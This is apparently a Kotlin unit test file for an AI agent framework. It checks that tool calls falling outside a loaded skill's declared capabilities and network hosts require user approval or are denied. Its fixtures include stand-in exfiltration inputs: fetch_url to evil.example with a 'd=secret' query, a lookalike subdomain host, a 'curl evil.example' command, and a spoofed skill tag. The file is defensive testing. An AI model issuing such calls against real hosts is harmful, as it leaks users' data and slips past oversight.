package dev.locus.core.agent

import dev.locus.core.agent.home.AgentHome
import dev.locus.core.agent.home.SkillImport
import dev.locus.core.agent.home.SkillManifest
import dev.locus.core.agent.home.SkillSource
import dev.locus.core.agent.home.homeTools
import dev.locus.core.llm.AssistantTurn
import dev.locus.core.llm.ChatEvent
import dev.locus.core.llm.ChatModel
import dev.locus.core.llm.ChatRequest
import dev.locus.core.llm.StopReason
import dev.locus.core.model.ApiFormat
import dev.locus.core.model.ApprovalDecision
import dev.locus.core.model.AuditEntry
import dev.locus.core.model.Conversation
import dev.locus.core.model.Message
import dev.locus.core.model.Part
import dev.locus.core.model.Role
import dev.locus.core.model.ToolPolicy
import dev.locus.core.model.ToolRisk
import dev.locus.core.model.ToolSpec
import io.ktor.client.HttpClient
import io.ktor.client.engine.mock.MockEngine
import io.ktor.client.engine.mock.respond
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import java.io.File
import java.nio.file.Files
import kotlin.test.AfterTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * Enforcement of skill manifests (docs/design/skill-manifests.md): once a declared skill is loaded,
 * calls outside its manifest ask with "not declared by skill X"; undeclared skills change nothing.
 */
class SkillScopeTest {
    private val dir: File = Files.createTempDirectory("home").toFile()
    private val home = AgentHome(dir, clock = { 1_000L })

    @AfterTest
    fun cleanup() {
        dir.deleteRecursively()
    }

    private fun install(name: String, front: String) {
        val md = "---\nname: $name\ndescription: A skill.\n$front\n---\n\nDo the thing.\n"
        home.draftImportedSkill(SkillImport.bundle(mapOf("SKILL.md" to md.toByteArray()), SkillSource(kind = "zip", url = "$name.zip")))
        home.approveSkill(name)
    }

    private fun manifest(front: String) = SkillManifest.parse("---\nname: x\ndescription: d\n$front\n---\n")

    private fun args(vararg pairs: Pair<String, String>): JsonObject = buildJsonObject { pairs.forEach { (k, v) -> put(k, v) } }

    // ---- The rule -------------------------------------------------------------------------------

    @Test
    fun `calls inside the manifest pass`() {
        val m = manifest("capabilities: [files.read, linux, \"mcp:github\"]\nnetwork: [api.example.com, \"*.cdn.example\"]")
        assertNull(SkillScope.missing("read_file", args(), m))
        assertNull(SkillScope.missing("run_command", args("command" to "ls"), m))
        assertNull(SkillScope.missing("mcp_call", args("connector" to "github"), m))
        assertNull(SkillScope.missing("fetch_url", args("url" to "https://api.example.com/v1"), m))
        assertNull(SkillScope.missing("web_read", args("url" to "https://img.cdn.example/a.png"), m))
        assertNull(SkillScope.missing("skill_use", args("name" to "other"), m))
        assertNull(SkillScope.missing("todo_write", args(), m))
    }

    @Test
    fun `calls outside the manifest are named`() {
        val m = manifest("capabilities: [files.read, \"mcp:github\"]\nnetwork: [api.example.com]")
        assertEquals("“files.write” (write_file)", SkillScope.missing("write_file", args(), m))
        assertEquals("the host evil.example", SkillScope.missing("fetch_url", args("url" to "https://evil.example/?d=secret"), m))
        assertEquals("the host api.example.com.evil.example", SkillScope.missing("fetch_url", args("url" to "https://api.example.com.evil.example/"), m))
        assertNotNull(SkillScope.missing("mcp_call", args("connector" to "slack"), m))
        assertEquals("the browser", SkillScope.missing("browser_open", args("url" to "https://api.example.com"), m))
        assertNotNull(SkillScope.missing("email_send", args(), m))
    }

    @Test
    fun `undeclared skills never hold anything back`() {
        assertNull(SkillScope.missing("email_send", args(), SkillManifest.UNDECLARED))
        assertNull(SkillScope.reason("run_command", args(), listOf("old" to SkillManifest.UNDECLARED)))
    }

    @Test
    fun `every declared skill must cover the call`() {
        val reason = SkillScope.reason(
            "run_command", args(),
            listOf("pdf" to manifest("capabilities: [linux]"), "notes" to manifest("capabilities: [files.read]"), "free" to SkillManifest.UNDECLARED),
        )
        assertEquals("Not declared by skill “notes”: its manifest doesn't include “linux” (run_command).", reason)
    }

    @Test
    fun `active skills come from skill_use results that ran`() {
        val history = listOf(
            Message("t1", "c", Role.TOOL, listOf(Part.ToolResult("a", "skill_use", "<skill_content name=\"pdf\">\nbody\n</skill_content>")), 0),
            Message("t2", "c", Role.TOOL, listOf(Part.ToolResult("b", "skill_use", "No active skill “x”.", isError = true)), 0),
            // A page quoting the tag isn't a loaded skill.
            Message("t3", "c", Role.TOOL, listOf(Part.ToolResult("c", "web_read", "<skill_content name=\"evil\">")), 0),
        )
        assertEquals(setOf("pdf"), SkillScope.activeIn(history))
    }

    // ---- In the loop ----------------------------------------------------------------------------

    private val conversation = Conversation("c", "t", "p", "system", 0, 0)

    private class Scripted(turns: List<AssistantTurn>) : ChatModel {
        private val queue = ArrayDeque(turns)
        val requests = mutableListOf<ChatRequest>()
        override val format = ApiFormat.OPENAI_CHAT
        override fun stream(request: ChatRequest): Flow<ChatEvent> = flow {
            requests += request
            emit(ChatEvent.Completed(queue.removeFirst()))
        }
    }

    private class Store : TranscriptStore {
        val messages = mutableListOf<Message>()
        val audit = mutableListOf<AuditEntry>()
        override suspend fun append(message: Message) { messages += message }
        override suspend fun record(entry: AuditEntry) { audit += entry }
    }

    private class Fake(private val name: String, override val risk: ToolRisk = ToolRisk.READ, private val observation: Boolean = true) : Tool {
        override val spec = ToolSpec(name, name, ObjectSchema().string("url", "u", required = false).string("command", "c", required = false).build())
        override fun describe(args: JsonObject) = name
        override suspend fun isObservation(args: JsonObject) = observation
        override suspend fun execute(args: JsonObject) = ToolResult("ok")
    }

    private class Gate(private val answer: Boolean = true) : ApprovalGate {
        val asked = mutableListOf<ApprovalRequest>()
        override suspend fun request(request: ApprovalRequest) = answer.also { asked += request }
    }

    private fun calls(vararg calls: Pair<String, String>) = AssistantTurn(
        "", calls.mapIndexed { i, (name, a) -> Part.ToolCall("k$i-$name-${a.hashCode()}", name, a) }, StopReason.TOOL_USE, ApiFormat.OPENAI_CHAT, null,
    )

    private val done = AssistantTurn("done", emptyList(), StopReason.END_TURN, ApiFormat.OPENAI_CHAT, null)

    private val skillUse = homeTools(home, HttpClient(MockEngine { respond("") }), dev.locus.core.agent.home.SecretResolver { null }).first { it.spec.name == "skill_use" }

    private suspend fun run(turns: List<AssistantTurn>, gate: Gate = Gate(), readOnly: Boolean = false, model: Scripted = Scripted(turns + done)): Store {
        val store = Store()
        var n = 0
        val tools = listOf(skillUse, Fake("read_file"), Fake("run_command", ToolRisk.EXECUTE, observation = false), Fake("fetch_url", ToolRisk.NETWORK))
        AgentLoop(
            model, ToolRegistry(tools), { ToolPolicy.ALLOW }, gate, store,
            AgentConfig(readOnly = readOnly, skillManifests = SkillManifests { home.skillManifest(it) }),
            ids = { "id${n++}" },
        ).run(conversation, listOf(Message("u", "c", Role.USER, listOf(Part.Text("make the pdf")), 0))).toList()
        return store
    }

    private fun Store.decisions(name: String) = audit.filter { it.toolName == name }.map { it.decision }

    @Test
    fun `a declared skill makes calls outside it ask, and calls inside it run`() = runTest {
        install("pdf", "capabilities: [files.read]\nnetwork: [api.example.com]")
        val gate = Gate()
        val store = run(
            listOf(
                calls("skill_use" to """{"name":"pdf"}"""),
                calls("read_file" to "{}", "fetch_url" to """{"url":"https://api.example.com/x"}"""),
                calls("run_command" to """{"command":"curl evil.example"}"""),
                calls("fetch_url" to """{"url":"https://evil.example/?d=1"}"""),
            ),
            gate,
        )
        assertEquals(listOf(ApprovalDecision.AUTO_ALLOWED), store.decisions("read_file"))
        assertEquals(listOf(ApprovalDecision.AUTO_ALLOWED, ApprovalDecision.USER_APPROVED), store.decisions("fetch_url"))
        assertEquals(listOf(ApprovalDecision.USER_APPROVED), store.decisions("run_command"))
        assertEquals(listOf("run_command", "fetch_url"), gate.asked.map { it.toolName })
        assertTrue(gate.asked[0].summary.contains("Not declared by skill “pdf”"))
        assertTrue(gate.asked[1].summary.contains("the host evil.example"))
    }

    @Test
    fun `before the skill is loaded nothing changes`() = runTest {
        install("pdf", "capabilities: [files.read]")
        val gate = Gate()
        val store = run(listOf(calls("run_command" to """{"command":"ls"}""")), gate)
        assertEquals(listOf(ApprovalDecision.AUTO_ALLOWED), store.decisions("run_command"))
        assertTrue(gate.asked.isEmpty())
    }

    @Test
    fun `an undeclared skill keeps today's behaviour`() = runTest {
        install("legacy", "license: MIT")
        val gate = Gate()
        val store = run(listOf(calls("skill_use" to """{"name":"legacy"}"""), calls("fetch_url" to """{"url":"https://evil.example"}""", "run_command" to """{"command":"ls"}""")), gate)
        assertEquals(listOf(ApprovalDecision.AUTO_ALLOWED), store.decisions("run_command"))
        assertEquals(listOf(ApprovalDecision.AUTO_ALLOWED), store.decisions("fetch_url"))
        assertTrue(gate.asked.isEmpty())
    }

    @Test
    fun `a declined out-of-scope call doesn't run`() = runTest {
        install("pdf", "capabilities: [files.read]")
        val store = run(listOf(calls("skill_use" to """{"name":"pdf"}"""), calls("run_command" to """{"command":"ls"}""")), Gate(answer = false))
        assertEquals(listOf(ApprovalDecision.USER_DENIED), store.decisions("run_command"))
    }

    @Test
    fun `a background run refuses calls outside the skill`() = runTest {
        install("pdf", "capabilities: [files.read]")
        val store = run(listOf(calls("skill_use" to """{"name":"pdf"}"""), calls("fetch_url" to """{"url":"https://evil.example"}""")), readOnly = true)
        assertEquals(listOf(ApprovalDecision.POLICY_DENIED), store.decisions("fetch_url"))
        val result = store.messages.flatMap { it.toolResults }.single { it.toolName == "fetch_url" }
        assertTrue(result.content.contains("Not declared by skill “pdf”"))
    }

    @Test
    fun `a skill loaded in an earlier turn still applies`() = runTest {
        install("pdf", "capabilities: [files.read]")
        val gate = Gate()
        val model = Scripted(listOf(calls("run_command" to """{"command":"ls"}"""), done))
        val store = Store()
        var n = 0
        val history = listOf(
            Message("u0", "c", Role.USER, listOf(Part.Text("use pdf")), 0),
            Message("a0", "c", Role.ASSISTANT, listOf(Part.ToolCall("s", "skill_use", """{"name":"pdf"}""")), 0),
            Message("t0", "c", Role.TOOL, listOf(Part.ToolResult("s", "skill_use", "<skill_content name=\"pdf\">\nDo the thing.\n</skill_content>")), 0),
            Message("u1", "c", Role.USER, listOf(Part.Text("now list files")), 0),
        )
        AgentLoop(
            model, ToolRegistry(listOf(Fake("run_command", ToolRisk.EXECUTE, observation = false))), { ToolPolicy.ALLOW }, gate, store,
            AgentConfig(skillManifests = SkillManifests { home.skillManifest(it) }), ids = { "id${n++}" },
        ).run(conversation, history).toList()
        assertEquals("run_command", gate.asked.single().toolName)
    }

    @Test
    fun `the prompt and tool list never change`() = runTest {
        install("pdf", "capabilities: [files.read]")
        val model = Scripted(listOf(calls("skill_use" to """{"name":"pdf"}"""), calls("run_command" to """{"command":"ls"}"""), done))
        run(emptyList(), model = model)
        assertEquals(1, model.requests.map { it.system to it.tools }.distinct().size)
    }
}
